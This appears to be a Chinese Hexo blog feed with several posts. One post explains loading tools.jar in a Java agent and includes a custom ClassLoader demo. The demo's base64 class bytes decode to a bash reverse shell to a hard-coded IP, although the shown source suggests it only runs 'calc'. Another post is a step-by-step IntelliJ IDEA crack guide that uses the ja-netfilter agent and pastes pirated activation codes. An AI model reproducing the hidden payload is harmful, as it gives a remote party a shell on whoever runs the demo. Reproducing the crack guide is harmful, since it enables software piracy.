        <content type="html"><![CDATA[<h1 id="解决agent中tools加载的问题"><a href="#解决agent中tools加载的问题" class="headerlink" title="解决agent中tools加载的问题"></a>解决agent中tools加载的问题</h1><p>为什么有这个文章？因为我们在利用agent中的运行中attach pid需要利用到tools.jar的类不过默认java是不加载tools.jar类的所以我们需要解决它</p><p>解决方法是学大师傅们的方法的。</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>URLClassLoader去加载tools.jar路径并且将需要的类添加到map中，然后通过反射去实现。</p><p>代码：<a href="https://gist.github.com/Firebasky/c1efd9dc7eb964a77cb788c170a8598f">https://gist.github.com/Firebasky/c1efd9dc7eb964a77cb788c170a8598f</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.io.<span class="type">File</span> <span class="variable">toolsPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>, <span class="string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="string">&quot;tools.jar&quot;</span>);</span><br><span class="line">java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> toolsPath.toURI().toURL();</span><br><span class="line"><span class="comment">//URL url1 = new URL(&quot;file:C:\\Program Files\\java\\jdk1.8.0_201\\lib\\tools.jar&quot;);</span></span><br><span class="line"><span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[] &#123; url &#125;, Thread.currentThread().getContextClassLoader());</span><br></pre></td></tr></table></figure><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>自定义加载器</p><p><a href="https://xz.aliyun.com/t/10075#toc-4">https://xz.aliyun.com/t/10075#toc-4</a></p><blockquote><p>自定义的classLoader。但是我们都知道classLoader在loadClass的时候采用双亲委托机制，也就是如果系统中已经存在一个类，即使我们用自定义的classLoader去loadClass，也会返回系统内置的那个类。但是如果我们绕过loadClass，直接去defineClass即可从我们指定的字节码数组里创建类，而且类名我们可以任意自定义，重写java.lang.String都没问题:) 然后再用defineClass返回的Class去实例化。</p></blockquote><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sun.tools.attach;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VirtualMachine</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String cmd)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,cmd&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException ee)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Myloader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> <span class="comment">//继承ClassLoader</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">get</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;<span class="comment">//直接使用defineClass返回class对象</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String classStr=<span class="string">&quot;yv66vgAAADkALgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwcADgEAEGphdmEvbGFuZy9TdHJpbmcIABABAAkvYmluL2Jhc2gIABIBAAItYwgAFAEAVmV4ZWMgNTw+L2Rldi90Y3AvMS4xMTYuMTM2LjEyMC8yMzMzO2NhdCA8JjUgfCB3aGlsZSByZWFkIGxpbmU7IGRvICRsaW5lIDI+JjUgPiY1OyBkb25lCgAIABYMABcAGAEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7BwAaAQATamF2YS9pby9JT0V4Y2VwdGlvbggAHAEAA2NtZAgAHgEAAi9jBwAgAQAtY29tL2ZpcmViYXNreS9zdW4vdG9vbHMvYXR0YWNoL1ZpcnR1YWxNYWNoaW5lAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAC9MY29tL2ZpcmViYXNreS9zdW4vdG9vbHMvYXR0YWNoL1ZpcnR1YWxNYWNoaW5lOwEAB2V4ZWN1dGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBABNWaXJ0dWFsTWFjaGluZS5qYXZhACEAHwACAAAAAAACAAEABQAGAAEAIQAAAC8AAQABAAAABSq3AAGxAAAAAgAiAAAABgABAAAABQAjAAAADAABAAAABQAkACUAAAAJACYAJwABACEAAAC3AAUAAwAAADy4AAcGvQANWQMSD1NZBBIRU1kFEhNTtgAVV6cAIUy4AAcGvQANWQMSG1NZBBIdU1kFKlO2ABVXpwAETbEAAgAAABoAHQAZAB4ANwA6ABkAAwAiAAAAHgAHAAAACAAaAA4AHQAJAB4ACwA3AA0AOgAMADsADwAjAAAAFgACAB4AHQAoACkAAQAAADwAHAAqAAAAKwAAABkAA10HABn/ABwAAgcADQcAGQABBwAZ+gAAAAEALAAAAAIALQ==&quot;</span>;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myloader</span>().get(Base64.getDecoder().decode(classStr));</span><br><span class="line">            <span class="keyword">for</span> (Method m:result.getDeclaredMethods())</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.println(m.getName());</span><br><span class="line">                <span class="keyword">if</span> (m.getName().equals(<span class="string">&quot;execute&quot;</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    m.invoke(result,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不得不佩服大师傅啊！！！</p>]]></content>
      
      
      <categories>
          
          <category> obsidian hexo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>H4ckbird 祝你有美好的一天！</title>
      <link href="/2022/11/09/hello-world/"/>
      <url>/2022/11/09/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Test-My’s-Blog"><a href="#Test-My’s-Blog" class="headerlink" title="Test My’s Blog"></a>Test My’s Blog</h2><ul><li>如果能够看到这篇文章说明成功了</li><li>这里是显示的内容</li><li>我发现自己就是蠢货</li></ul><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate   hexo g</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy  hexo d</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jQuery基础</title>
      <link href="/2022/10/24/jQuery%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/10/24/jQuery%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>课上jQuery讲解的代码：</strong></p><p><a href="https://github.com/Erinipig/-/tree/main/%E5%AF%B9%E6%9F%90%E5%9F%B9%E8%AE%AD%E6%9C%BA%E6%9E%84%E7%9A%84%E7%A0%94%E7%A9%B6/%E6%9F%90%E6%A0%A1%E4%BC%81%E5%90%88%E4%BD%9C%E5%9F%B9%E8%AE%AD%E6%9C%BA%E6%9E%84%E5%9F%B9%E8%AE%AD%E8%B5%84%E6%96%99/WEB%E4%B8%89%E4%BB%B6%E5%A5%97/JAVASCRIPT/javascript%20basic/BASIC">https://github.com/Erinipig/-/tree/main/%E5%AF%B9%E6%9F%90%E5%9F%B9%E8%AE%AD%E6%9C%BA%E6%9E%84%E7%9A%84%E7%A0%94%E7%A9%B6/%E6%9F%90%E6%A0%A1%E4%BC%81%E5%90%88%E4%BD%9C%E5%9F%B9%E8%AE%AD%E6%9C%BA%E6%9E%84%E5%9F%B9%E8%AE%AD%E8%B5%84%E6%96%99/WEB%E4%B8%89%E4%BB%B6%E5%A5%97/JAVASCRIPT/javascript%20basic/BASIC</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jQuery基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PythonSec</title>
      <link href="/2022/10/21/PythonSec/"/>
      <url>/2022/10/21/PythonSec/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b51dc264cb37bc53e3ddebaf4ed0bdac601233f5e825831707a04a82f9db0b5d">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f79ae02593b7b02f0446f48d67e6ee7a2af93499f2d4756e3e8753512288d6a09ad4aaaa49fb1571e89907301a31bf7e180577b186bdef76f2eed66b0259257aa562353a80b8aa575686cc7fafd3d86664753c8431cebf2ac21220f87d04ed07b6eff5ac1a59a1153215370bfd9f54af7ba350220d322b880695f795b476829abd42d1a5d35cf49542220580c2d502a0c4309f87228ee6fccf64fccc8da998c43f6a6b021d3eabda6667a896f67d63f658027f0da2014c84e09be4f2689b02ea5c28280a2a79bb5cdcf8f819823ee8d11894f63b5f2033c529d9c855a698874a0a891e434887ec2a953eff04cc4d0318c6b91b1b693c65a0e2b0fb2f1845f9e237a12088415ac8ce86f12f907a05eb7893952e246de00e49d9f8166b67d003b6e1362e4e17e159becfd2c0efa8e56ec5a3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">旅行者，这里需要密码才可以访问哦！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Python安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaSec</title>
      <link href="/2022/06/21/JavaSec/"/>
      <url>/2022/06/21/JavaSec/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="323fef4b6167a2193f2a9c41da67b3ec589089abd9929d0dc764a48bfb82c234">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f7dc240770bb65efcf40282cb335336366056f1aecead61d7dad29a73b32810672f574192d3d13cb2a8444a6527d1660f31db106d643e00f8ea7e47e3d934aa09a7f5d1d6eee1f7c294059a33a7ef75553329d2d3113ca6154d07cc43b7d66387bebac79eaa533c40fffd25c3c8c1a3db89e809aae83b4b3ca713bf12c5fe6f865d3f0e104ad6de3decc6743f33803326e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入正确的密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idea安装配置</title>
      <link href="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
      <url>/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="IntelliJ-Idea安装配置"><a href="#IntelliJ-Idea安装配置" class="headerlink" title="IntelliJ Idea安装配置"></a>IntelliJ Idea安装配置</h1><h2 id="IntelliJ-IDEA-2022-02-03（不推荐屁事多）"><a href="#IntelliJ-IDEA-2022-02-03（不推荐屁事多）" class="headerlink" title="IntelliJ IDEA 2022.02.03（不推荐屁事多）"></a>IntelliJ IDEA 2022.02.03（不推荐屁事多）</h2><h3 id="安装包下载"><a href="#安装包下载" class="headerlink" title="安装包下载"></a>安装包下载</h3><ul><li><a href="https://www.jetbrains.com/idea/download/#section=windows">https://www.jetbrains.com/idea/download/#section=windows</a></li><li><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/1.png" alt="image-1"></li><li>自己选定安装的路径，然后下一步下一步就OK，到这里<strong>注意一下</strong>就行，<strong>下面的也是一样</strong>：</li><li><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/2.png" alt="image-2"></li></ul><h3 id="补丁下载："><a href="#补丁下载：" class="headerlink" title="补丁下载："></a>补丁下载：</h3><p>下载之后，我们这里将其拷贝到C盘根目录下，<code>C:\ja-netfilter</code>。</p><h4 id="引入补丁"><a href="#引入补丁" class="headerlink" title="引入补丁"></a>引入补丁</h4><p>进入自己的IDEA安装路径下的的bin目录，配置bin目录下的<strong>idea64.exe.vmoptions</strong>文件</p><p><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/3.png" alt="image-3"></p><p>添加以下内容至该文件末尾，记得保存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 引用补丁，补丁不能包含中文路径，否则会失效</span><br><span class="line">-javaagent:C:/ja-netfilter/ja-netfilter.jar</span><br><span class="line"># 最新Idea 版本需要添加下面两行，否则会报 key valid</span><br><span class="line">--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED</span><br></pre></td></tr></table></figure><p><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/4.png" alt="image-4"></p><h3 id="运行补丁文件："><a href="#运行补丁文件：" class="headerlink" title="运行补丁文件："></a>运行补丁文件：</h3><ul><li><p><strong><em>破解是选择第二个</em></strong></p></li><li><p>uistall.sh为mac、linux相关版本的卸载程序</p></li><li>uinstall-*.vbs为windows相关版本的卸载程序</li></ul><p><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/5.png" alt="image-5"></p><h3 id="激活IDEA"><a href="#激活IDEA" class="headerlink" title="激活IDEA"></a>激活IDEA</h3><ul><li>打开IDEA，并输入下面的激活码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZCB571FZHV-eyJsaWNlbnNlSWQiOiJaQ0I1NzFGWkhWIiwibGljZW5zZWVOYW1lIjoiZnV6emVzIGFsbHkiLCJhc3NpZ25lZU5hbWUiOiIiLCJhc3NpZ25lZUVtYWlsIjoiIiwibGljZW5zZVJlc3RyaWN0aW9uIjoiIiwiY2hlY2tDb25jdXJyZW50VXNlIjpmYWxzZSwicHJvZHVjdHMiOlt7ImNvZGUiOiJQREIiLCJmYWxsYmFja0RhdGUiOiIyMDIzLTA3LTAxIiwicGFpZFVwVG8iOiIyMDIzLTA3LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBTSSIsImZhbGxiYWNrRGF0ZSI6IjIwMjMtMDctMDEiLCJwYWlkVXBUbyI6IjIwMjMtMDctMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFBDIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMy0wNy0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQQ1dNUCIsImZhbGxiYWNrRGF0ZSI6IjIwMjMtMDctMDEiLCJwYWlkVXBUbyI6IjIwMjMtMDctMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFBTIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMy0wNy0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUkIiLCJmYWxsYmFja0RhdGUiOiIyMDIzLTA3LTAxIiwicGFpZFVwVG8iOiIyMDIzLTA3LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IklJIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMy0wNy0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUEdPIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMy0wNy0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQU1ciLCJmYWxsYmFja0RhdGUiOiIyMDIzLTA3LTAxIiwicGFpZFVwVG8iOiIyMDIzLTA3LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBXUyIsImZhbGxiYWNrRGF0ZSI6IjIwMjMtMDctMDEiLCJwYWlkVXBUbyI6IjIwMjMtMDctMDEiLCJleHRlbmRlZCI6dHJ1ZX1dLCJtZXRhZGF0YSI6IjAxMjAyMjA3MDFQU0FOMDAwMDA1IiwiaGFzaCI6IlRSSUFMOi01OTQ5ODgxMjIiLCJncmFjZVBlcmlvZERheXMiOjcsImF1dG9Qcm9sb25nYXRlZCI6ZmFsc2UsImlzQXV0b1Byb2xvbmdhdGVkIjpmYWxzZX0=-JNpWl3tvfBw9nYALTrBlJzoryrKHhqmiBxP5IljC6Hlgmb6YlOH8vPngzoyLYa+cGDMVj6fipEpm+BEqIA7oAoBYSu1ZPdzkHAa94apJg+CUQwuw+EJaATdKTANuKYTBsay6WsnrUh8vbIaJpGz19z+uOAc4xRP+gtuyjiwkNECZ6Y9qD+Dx3Gm5xXI3UvKqjPYIhXk23n1pjlxFIUmhD7BumdxF8JHmJJhd/K5FaXQU/K9pMp70GfmSS2KJgxm6SXfslWs/bF5GTY3i1GA6ez05ZyJwsmJMZ1v6W7GWrWNHDLK7i7aXhOLdK9u+pCz+2FpKmadRznpSmixDzj37ig==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD</span><br></pre></td></tr></table></figure><ul><li><p>点击Active进行激活</p></li><li><p>perfect！！！</p></li></ul><h2 id="IntelliJ-IDEA-2021-3-3安装配置（推荐）"><a href="#IntelliJ-IDEA-2021-3-3安装配置（推荐）" class="headerlink" title="IntelliJ IDEA 2021.3.3安装配置（推荐）"></a>IntelliJ IDEA 2021.3.3安装配置（推荐）</h2><h3 id="安装包官网下载："><a href="#安装包官网下载：" class="headerlink" title="安装包官网下载："></a>安装包官网下载：</h3><ul><li><a href="https://download.jetbrains.com/idea/ideaIU-2021.3.3.exe">2021.3.3 - Windows x64 (exe)</a></li><li><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/6.png" alt="image-6"> </li></ul><h3 id="安装步骤同上"><a href="#安装步骤同上" class="headerlink" title="安装步骤同上"></a>安装步骤同上</h3><h3 id="补丁下载：-1"><a href="#补丁下载：-1" class="headerlink" title="补丁下载："></a>补丁下载：</h3><ul><li>下载之后，我们这里将其拷贝到C盘根目录下，<code>C:\ja-netfilter-all</code></li><li>Windows 系统，点击运行 <code>install-current-user.vbs</code> 脚本，为当前用户安装破解补丁。</li><li>Mac/Linux 系统，点击运行 <code>install.sh</code> 脚本安装。</li></ul><p><strong>备注：</strong><code>install-all-users.vbs</code> 为系统所有用户安装，不推荐。<code>unistall-*</code>前缀的是卸载补丁脚本。</p><p><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/5.png" alt="image-5"></p><p>运行激活脚本增加环境变量</p><p>我们这里是windows，运行<code>install-current-user.vbs</code>出现弹窗，点击确定！！出现Done代表完成了。可以去环境变量中查看是否成功。</p><h3 id="激活IDEA-1"><a href="#激活IDEA-1" class="headerlink" title="激活IDEA"></a>激活IDEA</h3><ul><li><p>打开IDEA，并输入下面的激活码</p></li><li><pre><code>4W9NP3KV9E-eyJsaWNlbnNlSWQiOiI0VzlOUDNLVjlFIiwibGljZW5zZWVOYW1lIjoic2NyaXAgd2FuZSIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IklJIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wMS0yNCIsInBhaWRVcFRvIjoiMjAyMy0wMS0yNCIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUERCIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wMS0yNCIsInBhaWRVcFRvIjoiMjAyMy0wMS0yNCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQV1MiLCJmYWxsYmFja0RhdGUiOiIyMDIzLTAxLTI0IiwicGFpZFVwVG8iOiIyMDIzLTAxLTI0IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBHTyIsImZhbGxiYWNrRGF0ZSI6IjIwMjMtMDEtMjQiLCJwYWlkVXBUbyI6IjIwMjMtMDEtMjQiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFBTIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wMS0yNCIsInBhaWRVcFRvIjoiMjAyMy0wMS0yNCIsImV4dGVuZGVkIjp0cnVlfSx7